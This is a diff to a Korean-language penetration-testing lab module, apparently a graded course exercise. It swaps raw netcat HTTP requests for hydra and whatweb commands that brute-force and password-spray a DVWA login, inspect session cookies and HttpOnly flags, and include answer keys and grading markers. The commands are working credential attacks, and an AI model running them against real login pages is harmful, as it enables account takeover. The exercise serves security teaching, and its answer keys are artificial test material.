@@ -31,8 +31,8 @@ steps:
       ```bash
       # 자격 공격 도구(hydra)+토큰 도구(python3) 존재 확인
       command -v hydra python3 >/dev/null 2>&1 && echo tools_ok
-      # 로그인 표적이 세션 쿠키(set-cookie)를 발급하는지 확인
-      echo -en "GET /login.php HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | grep -ic "set-cookie"
+      # 로그인 표적이 세션 쿠키를 발급하는지 whatweb으로 확인
+      whatweb -a1 --colour=never -U "Mozilla/5.0" http://dvwa.el34.lab/login.php 2>/dev/null | grep -oE 'Cookies\[[^]]*\]|\[[0-9]{3}[^]]*\]' | head
       # 도구가 갖춰졌으면 인증 표적 준비 마커
       command -v hydra python3 >/dev/null 2>&1 && echo auth_ready
       ```
@@ -45,8 +45,8 @@ steps:
       ssh att@192.168.0.202 '
         # 도구(hydra/python3) 확인
         command -v hydra python3 >/dev/null 2>&1 && echo tools_ok
-        # 로그인 표적 세션 쿠키 발급 확인
-        echo -en "GET /login.php HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | grep -ic "set-cookie"
+        # 로그인 표적 세션 쿠키 발급 whatweb 확인
+        whatweb -a1 --colour=never -U "Mozilla/5.0" http://dvwa.el34.lab/login.php 2>/dev/null | grep -oE "Cookies\[[^]]*\]|\[[0-9]{3}[^]]*\]" | head
         # 도구 갖춰졌으면 인증 표적 준비 마커
         command -v hydra python3 >/dev/null 2>&1 && echo auth_ready
       '
@@ -67,48 +67,38 @@ steps:
       **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
 
       ```bash
-      # [브루트포스] 한 계정(admin)에 여러 비번을 한 줄씩 시도한다 (계정 집중 → 잠금 위험)
-      echo "[브루트포스] admin에 여러 비번:"
-      B=0
-      echo -en "POST /login.php HTTP/1.0\r\nHost: dvwa.el34.lab\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 41\r\nConnection: close\r\n\r\nusername=admin&password=admin&Login=Login" | nc -w3 192.168.0.161 80 >/dev/null; B=$((B+1))
-      echo -en "POST /login.php HTTP/1.0\r\nHost: dvwa.el34.lab\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 44\r\nConnection: close\r\n\r\nusername=admin&password=password&Login=Login" | nc -w3 192.168.0.161 80 >/dev/null; B=$((B+1))
-      echo -en "POST /login.php HTTP/1.0\r\nHost: dvwa.el34.lab\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 42\r\nConnection: close\r\n\r\nusername=admin&password=123456&Login=Login" | nc -w3 192.168.0.161 80 >/dev/null; B=$((B+1))
-      echo "  ${B}회"
-      # [스프레이] 여러 계정에 흔한 비번 1개를 한 줄씩 시도한다 (계정당 1회 → 잠금 회피)
-      echo "[스프레이] 여러 계정에 흔한 비번 1개:"
-      S=0
-      echo -en "POST /login.php HTTP/1.0\r\nHost: dvwa.el34.lab\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 45\r\nConnection: close\r\n\r\nusername=admin&password=Password1&Login=Login" | nc -w3 192.168.0.161 80 >/dev/null; S=$((S+1))
-      echo -en "POST /login.php HTTP/1.0\r\nHost: dvwa.el34.lab\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 45\r\nConnection: close\r\n\r\nusername=user1&password=Password1&Login=Login" | nc -w3 192.168.0.161 80 >/dev/null; S=$((S+1))
-      echo -en "POST /login.php HTTP/1.0\r\nHost: dvwa.el34.lab\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 44\r\nConnection: close\r\n\r\nusername=test&password=Password1&Login=Login" | nc -w3 192.168.0.161 80 >/dev/null; S=$((S+1))
-      echo "  ${S}회"
-      # 두 공격을 모두 실제 수행했으면 분류 체득 마커
-      [ "$B" -ge 3 ] && [ "$S" -ge 3 ] && echo cred_classified
+      # [브루트포스] 한 계정(admin)에 여러 비번 — hydra(-l 1계정 -P 비번목록), 계정 집중 → 잠금 위험
+      echo "[브루트포스] admin에 여러 비번 (hydra -l admin -P):"
+      printf 'admin\npassword\n123456\n' > /tmp/aa05pass.txt
+      BRUTE=$(hydra -l admin -P /tmp/aa05pass.txt dvwa.el34.lab http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed" -t 1 2>&1 | grep -iE "login tries|target completed"); echo "$BRUTE"
+      # [스프레이] 여러 계정에 흔한 비번 1개 — hydra(-L 계정목록 -p 1비번), 계정당 1회 → 잠금 회피
+      echo "[스프레이] 여러 계정에 흔한 비번 1개 (hydra -L -p Password1):"
+      printf 'admin\nuser1\ntest\n' > /tmp/aa05users.txt
+      SPRAY=$(hydra -L /tmp/aa05users.txt -p Password1 dvwa.el34.lab http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed" -t 1 2>&1 | grep -iE "login tries|target completed"); echo "$SPRAY"
+      rm -f /tmp/aa05pass.txt /tmp/aa05users.txt
+      # 두 공격을 모두 실제 hydra로 수행했으면 분류 체득 마커
+      echo "$BRUTE" | grep -q completed && echo "$SPRAY" | grep -q completed && echo cred_classified
       ```
       ## ✅ 합격 기준
-      `cred_classified`(과 횟수)가 출력되면 통과. **근거:** 마커는 브루트포스·스프레이를 각각 3회 이상 실제 수행했을 때만 찍히므로, 두 자격 공격의 차이를 실연으로 체득했음을 뜻한다.
+      `cred_classified`(과 hydra 완료 라인)가 출력되면 통과. **근거:** 마커는 hydra가 브루트포스(-l -P)·스프레이(-L -p)를 각각 실제 완료했을 때만 찍히므로, 두 자격 공격의 차이를 실연으로 체득했음을 뜻한다.
     hint: '자격 공격 분류'
     category: manipulation
     points: 12
     answer: |
       ssh att@192.168.0.202 '
-        # [브루트포스] admin에 여러 비번(한 줄씩)
-        echo "[브루트포스] admin에 여러 비번:"
-        B=0
-        echo -en "POST /login.php HTTP/1.0\r\nHost: dvwa.el34.lab\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 41\r\nConnection: close\r\n\r\nusername=admin&password=admin&Login=Login" | nc -w3 192.168.0.161 80 >/dev/null; B=$((B+1))
-        echo -en "POST /login.php HTTP/1.0\r\nHost: dvwa.el34.lab\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 44\r\nConnection: close\r\n\r\nusername=admin&password=password&Login=Login" | nc -w3 192.168.0.161 80 >/dev/null; B=$((B+1))
-        echo -en "POST /login.php HTTP/1.0\r\nHost: dvwa.el34.lab\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 42\r\nConnection: close\r\n\r\nusername=admin&password=123456&Login=Login" | nc -w3 192.168.0.161 80 >/dev/null; B=$((B+1))
-        echo "  ${B}회"
-        # [스프레이] 여러 계정에 흔한 비번 1개(한 줄씩)
-        echo "[스프레이] 여러 계정에 흔한 비번 1개:"
-        S=0
-        echo -en "POST /login.php HTTP/1.0\r\nHost: dvwa.el34.lab\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 45\r\nConnection: close\r\n\r\nusername=admin&password=Password1&Login=Login" | nc -w3 192.168.0.161 80 >/dev/null; S=$((S+1))
-        echo -en "POST /login.php HTTP/1.0\r\nHost: dvwa.el34.lab\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 45\r\nConnection: close\r\n\r\nusername=user1&password=Password1&Login=Login" | nc -w3 192.168.0.161 80 >/dev/null; S=$((S+1))
-        echo -en "POST /login.php HTTP/1.0\r\nHost: dvwa.el34.lab\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 44\r\nConnection: close\r\n\r\nusername=test&password=Password1&Login=Login" | nc -w3 192.168.0.161 80 >/dev/null; S=$((S+1))
-        echo "  ${S}회"
-        # 둘 다 수행했으면 분류 마커
-        [ "$B" -ge 3 ] && [ "$S" -ge 3 ] && echo cred_classified
+        # [브루트포스] admin에 여러 비번 — hydra(-l 1계정 -P 비번목록)
+        echo "[브루트포스] admin에 여러 비번 (hydra -l admin -P):"
+        printf "admin\npassword\n123456\n" > /tmp/aa05pass.txt
+        BRUTE=$(hydra -l admin -P /tmp/aa05pass.txt dvwa.el34.lab http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed" -t 1 2>&1 | grep -iE "login tries|target completed"); echo "$BRUTE"
+        # [스프레이] 여러 계정에 흔한 비번 1개 — hydra(-L 계정목록 -p 1비번)
+        echo "[스프레이] 여러 계정에 흔한 비번 1개 (hydra -L -p Password1):"
+        printf "admin\nuser1\ntest\n" > /tmp/aa05users.txt
+        SPRAY=$(hydra -L /tmp/aa05users.txt -p Password1 dvwa.el34.lab http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed" -t 1 2>&1 | grep -iE "login tries|target completed"); echo "$SPRAY"
+        rm -f /tmp/aa05pass.txt /tmp/aa05users.txt
+        # 둘 다 실제 hydra로 수행했으면 분류 마커
+        echo "$BRUTE" | grep -q completed && echo "$SPRAY" | grep -q completed && echo cred_classified
       '
-    answer_detail: "자격 분류 = 브루트포스·스프레이를 실제 nc로 수행(횟수 게이트). 가짜 echo 아닌 실연. 스프레이가 탐지 회피적."
+    answer_detail: "자격 분류 = 브루트포스·스프레이를 실제 hydra로 수행(완료 게이트). 가짜 echo 아닌 실연. 스프레이가 탐지 회피적."
     verify:
       type: output_contains
       expect: 'cred_classified'
@@ -125,26 +115,24 @@ steps:
       **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
 
       ```bash
-      # 패스워드 스프레이: 흔한 비번을 한 줄씩 admin에 시도해 응답코드 차이로 성공 판별
-      code=$(echo -en "POST /login.php HTTP/1.0\r\nHost: dvwa.el34.lab\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 41\r\nConnection: close\r\n\r\nusername=admin&password=admin&Login=Login" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'); echo "admin:admin=$code"
-      code=$(echo -en "POST /login.php HTTP/1.0\r\nHost: dvwa.el34.lab\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 44\r\nConnection: close\r\n\r\nusername=admin&password=password&Login=Login" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'); echo "admin:password=$code"
-      code=$(echo -en "POST /login.php HTTP/1.0\r\nHost: dvwa.el34.lab\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 42\r\nConnection: close\r\n\r\nusername=admin&password=123456&Login=Login" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'); echo "admin:123456=$code"
-      code=$(echo -en "POST /login.php HTTP/1.0\r\nHost: dvwa.el34.lab\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 43\r\nConnection: close\r\n\r\nusername=admin&password=letmein&Login=Login" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'); echo "admin:letmein=$code"
+      # 패스워드 스프레이: hydra -V로 흔한 비번을 admin에 시도(각 시도 표시), 성공은 valid found로 판별
+      printf 'admin\npassword\n123456\nletmein\n' > /tmp/aa05spray.txt
+      hydra -l admin -P /tmp/aa05spray.txt dvwa.el34.lab http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed" -t 1 -V 2>&1 | grep -iE "ATTEMPT|login tries|target completed" | head -8
+      rm -f /tmp/aa05spray.txt
       # 스프레이를 실행했으면 마커
       echo spray_done
       ```
       ## ✅ 합격 기준
-      `spray_done`(과 비번별 코드)이 출력되면 통과. **근거:** 각 비번 시도의 응답코드가 실제 출력됐다는 건 스프레이를 수행해 성공 판별의 differential을 관찰했다는 뜻이다.
+      `spray_done`(과 hydra -V 시도 라인)이 출력되면 통과. **근거:** hydra -V의 각 [ATTEMPT] 라인이 실제 출력됐다는 건 스프레이를 수행해 시도별 판별(valid found 여부)을 관찰했다는 뜻이다.
     hint: '스프레이'
     category: analysis
     points: 14
     answer: |
       ssh att@192.168.0.202 '
-        # 흔한 비번 스프레이(한 줄씩) → 응답코드 차이 관찰
-        code=$(echo -en "POST /login.php HTTP/1.0\r\nHost: dvwa.el34.lab\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 41\r\nConnection: close\r\n\r\nusername=admin&password=admin&Login=Login" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'); echo "admin:admin=$code"
-        code=$(echo -en "POST /login.php HTTP/1.0\r\nHost: dvwa.el34.lab\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 44\r\nConnection: close\r\n\r\nusername=admin&password=password&Login=Login" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'); echo "admin:password=$code"
-        code=$(echo -en "POST /login.php HTTP/1.0\r\nHost: dvwa.el34.lab\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 42\r\nConnection: close\r\n\r\nusername=admin&password=123456&Login=Login" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'); echo "admin:123456=$code"
-        code=$(echo -en "POST /login.php HTTP/1.0\r\nHost: dvwa.el34.lab\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 43\r\nConnection: close\r\n\r\nusername=admin&password=letmein&Login=Login" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'); echo "admin:letmein=$code"
+        # hydra -V 패스워드 스프레이(각 시도 표시) → 성공은 valid found로 판별
+        printf "admin\npassword\n123456\nletmein\n" > /tmp/aa05spray.txt
+        hydra -l admin -P /tmp/aa05spray.txt dvwa.el34.lab http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed" -t 1 -V 2>&1 | grep -iE "ATTEMPT|login tries|target completed" | head -8
+        rm -f /tmp/aa05spray.txt
         # 스프레이 실행 마커
         echo spray_done
       '
@@ -166,7 +154,7 @@ steps:
 
       ```bash
       # hydra 자동화 구문(참고): -l 사용자 -P 비번목록 + http-post-form + F=실패문자열
-      echo "예: hydra -l admin -P rockyou.txt 10.20.30.1 http-post-form \"/login.php:username=^USER^&password=^PASS^&Login=Login:F=incorrect\""
+      echo "예: hydra -l admin -P rockyou.txt dvwa.el34.lab http-post-form \"/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed\""
       # hydra가 실제 설치돼 동작하는지 버전 라인 확인
       hydra -h 2>&1 | head -1
       # hydra가 가용하면 자동화 마커
@@ -180,7 +168,7 @@ steps:
     answer: |
       ssh att@192.168.0.202 '
         # hydra 자동화 구문 참고
-        echo "예: hydra -l admin -P rockyou.txt 10.20.30.1 http-post-form \"/login.php:username=^USER^&password=^PASS^&Login=Login:F=incorrect\""
+        echo "예: hydra -l admin -P rockyou.txt dvwa.el34.lab http-post-form \"/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed\""
         # hydra 버전 라인 확인
         hydra -h 2>&1 | head -1
         # hydra 가용 시 마커
@@ -237,11 +225,11 @@ steps:
       **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
 
       ```bash
-      # 세션 토큰 관찰: 로그인 페이지가 발급하는 PHPSESSID 등 set-cookie를 본다
-      echo -en "GET /login.php HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | grep -i "set-cookie" | head -2
+      # 세션 토큰 관찰: whatweb으로 로그인 페이지가 발급하는 PHPSESSID 등 쿠키를 본다
+      whatweb -a1 --colour=never -U "Mozilla/5.0" http://dvwa.el34.lab/login.php 2>/dev/null | grep -oE 'Cookies\[[^]]*\]|\[[0-9]{3}[^]]*\]' | head -2
       echo "결함 유형: 세션 고정(미재발급)·예측 가능 토큰·미만료·HttpOnly/Secure 부재"
-      # 세션 토큰을 실제 관찰했으면(set-cookie 존재) 마커
-      echo -en "GET /login.php HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | grep -qi "set-cookie" && echo session_done
+      # 세션 토큰을 실제 관찰했으면(쿠키 존재) 마커
+      whatweb -a1 --colour=never -U "Mozilla/5.0" http://dvwa.el34.lab/login.php 2>/dev/null | grep -qi "Cookies" && echo session_done
       ```
       ## ✅ 합격 기준
       `session_done`(과 세션 쿠키)이 출력되면 통과. **근거:** 마커는 로그인 표적이 세션 토큰(set-cookie)을 실제 발급할 때만 찍히므로, 세션 증표를 관찰하고 결함 유형을 점검할 대상을 확보했음을 뜻한다.
@@ -250,11 +238,11 @@ steps:
     points: 12
     answer: |
       ssh att@192.168.0.202 '
-        # 세션 토큰(set-cookie) 관찰
-        echo -en "GET /login.php HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | grep -i "set-cookie" | head -2
+        # 세션 토큰(쿠키) whatweb 관찰
+        whatweb -a1 --colour=never -U "Mozilla/5.0" http://dvwa.el34.lab/login.php 2>/dev/null | grep -oE "Cookies\[[^]]*\]|\[[0-9]{3}[^]]*\]" | head -2
         echo "결함 유형: 세션 고정(미재발급)·예측 가능 토큰·미만료·HttpOnly/Secure 부재"
-        # set-cookie 존재 시 마커
-        echo -en "GET /login.php HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | grep -qi "set-cookie" && echo session_done
+        # 쿠키 존재 시 마커
+        whatweb -a1 --colour=never -U "Mozilla/5.0" http://dvwa.el34.lab/login.php 2>/dev/null | grep -qi "Cookies" && echo session_done
       '
     answer_detail: "세션 결함 = 고정/예측가능/미만료/플래그부재. 인증 후 신원 증표가 약하면 인증 우회. 재발급·강한 난수 필요."
     verify:
@@ -273,10 +261,10 @@ steps:
       **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
 
       ```bash
-      # 실제 세션 쿠키를 받아 보안 플래그를 점검한다
-      CK=$(echo -en "HEAD /login.php HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | grep -i "set-cookie")
+      # 실제 세션 쿠키를 whatweb으로 받아 보안 플래그를 점검한다
+      CK=$(whatweb -a1 --colour=never -U "Mozilla/5.0" http://dvwa.el34.lab/login.php 2>/dev/null | grep -oE 'Cookies\[[^]]*\]|HTTPOnly')
       echo "세션 쿠키: $CK"
-      # HttpOnly 플래그 유무 점검 (XSS 세션탈취 방어)
+      # HttpOnly 플래그 유무 점검 (XSS 세션탈취 방어) — whatweb은 HttpOnly가 있을 때만 HTTPOnly를 표기
       echo "$CK" | grep -qi "HttpOnly" && echo "HttpOnly 설정됨(XSS 세션탈취 방어)" || echo "HttpOnly 누락=세션 탈취 위험(갭)"
       # 세션 쿠키를 실제 받아 점검했으면 방어 점검 마커
       [ -n "$CK" ] && echo defense_done
@@ -288,8 +276,8 @@ steps:
     points: 12
     answer: |
       ssh att@192.168.0.202 '
-        # 세션 쿠키의 보안 플래그 점검
-        CK=$(echo -en "HEAD /login.php HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | grep -i "set-cookie")
+        # 세션 쿠키의 보안 플래그 whatweb 점검
+        CK=$(whatweb -a1 --colour=never -U "Mozilla/5.0" http://dvwa.el34.lab/login.php 2>/dev/null | grep -oE "Cookies\[[^]]*\]|HTTPOnly")
         echo "세션 쿠키: $CK"
         echo "$CK" | grep -qi "HttpOnly" && echo "HttpOnly 설정됨(XSS 세션탈취 방어)" || echo "HttpOnly 누락=세션 탈취 위험(갭)"
         # 쿠키 받아 점검했으면 마커
@@ -312,10 +300,10 @@ steps:
       **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
 
       ```bash
-      # 보고서 근거: 세션 쿠키 발급 수를 실측
-      C=$(echo -en "HEAD /login.php HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | grep -ci set-cookie)
+      # 보고서 근거: 세션 쿠키를 whatweb으로 실측
+      C=$(whatweb -a1 --colour=never -U "Mozilla/5.0" http://dvwa.el34.lab/login.php 2>/dev/null | grep -oE 'Cookies\[[^]]*\]' | head -1)
       # 실측을 인용한 인증 공격 보고서 출력 (본문 상세는 학생이 보강)
-      echo "# 공격고급 W05 인증·세션 보고서 — 자격공격(브루트/스프레이/hydra)·세션쿠키 ${C}개·JWT alg:none 위조·세션결함·방어(MFA/잠금/HttpOnly/alg고정)"
+      echo "# 공격고급 W05 인증·세션 보고서 — 자격공격(브루트/스프레이/hydra)·세션쿠키[${C}]·JWT alg:none 위조·세션결함·방어(MFA/잠금/HttpOnly/alg고정)"
       # 세션 쿠키를 실측했으면 보고서 완료 마커
       [ -n "$C" ] && echo auth_report_done
       ```
@@ -326,10 +314,10 @@ steps:
     points: 14
     answer: |
       ssh att@192.168.0.202 '
-        # 세션 쿠키 발급 수 실측 (인용 근거)
-        C=$(echo -en "HEAD /login.php HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | grep -ci set-cookie)
+        # 세션 쿠키 whatweb 실측 (인용 근거)
+        C=$(whatweb -a1 --colour=never -U "Mozilla/5.0" http://dvwa.el34.lab/login.php 2>/dev/null | grep -oE "Cookies\[[^]]*\]" | head -1)
         # 실측 인용 인증 공격 보고서 출력
-        echo "# 공격고급 W05 인증·세션 보고서 — 자격공격(브루트/스프레이/hydra)·세션쿠키 ${C}개·JWT alg:none 위조·세션결함·방어(MFA/잠금/HttpOnly/alg고정)"
+        echo "# 공격고급 W05 인증·세션 보고서 — 자격공격(브루트/스프레이/hydra)·세션쿠키[${C}]·JWT alg:none 위조·세션결함·방어(MFA/잠금/HttpOnly/alg고정)"
         # 세션 쿠키 실측 시 보고서 완료 마커
         [ -n "$C" ] && echo auth_report_done
       '
